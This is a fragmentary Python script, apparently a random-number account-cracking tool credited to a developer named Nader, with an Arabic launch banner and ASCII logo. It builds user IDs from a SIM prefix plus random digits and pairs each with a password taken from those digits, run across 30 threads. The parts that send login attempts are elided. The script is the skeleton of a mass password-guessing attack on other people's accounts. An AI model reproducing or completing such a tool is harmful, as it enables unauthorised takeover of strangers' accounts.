...
g= datetime.datetime(2023, 9, 25, 12, 10 ,9)
...
import random
try:
    print('\033[1;32mتم تشغيل الاداه')
    time.sleep(3)
    v = 5.2
    update = ('5.2')
    update = ('5.2')
...
\033[1;31m                 _
\033[1;32m                | |
\033[1;33m _ __   __ _  __| | ___ _ __
\033[1;34m| '_ \ / _` |/ _` |/ _ \ '__|
\033[1;35m| | | | (_| | (_| |  __/ |
\033[1;36m|_| |_|\__,_|\__,_|\___|_|
''' 
...
def random_number():
	...
	os.system('clear')
	print(logo)
	print('\033[1;32m+-------------------------------------------------------------+\n\033[1;36mبسم الله الرحمان الرحيم                        \n\033[1;32m+-------------------------------------------------------------+\n\033[1;31mتم تطوير الاداه من قبل المطور نادر ')
	...
	for nmbr in range(limit):
		...
		nmp = ''.join(random.choice(string.digits) for _ in range(rng))
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('\033[1;31mSIM \033[1;32m>>\033[1;32m '+kode)
		print('\033[1;32mTOTAL IDS \033[1;32m>>\033[1;32m '+tl)
		print('\033[1;34mtle(2)»» @nader20090 ☑')
		#print(54*'_')
		for guru in user:
			uid = kode+guru
			pwx = [guru]
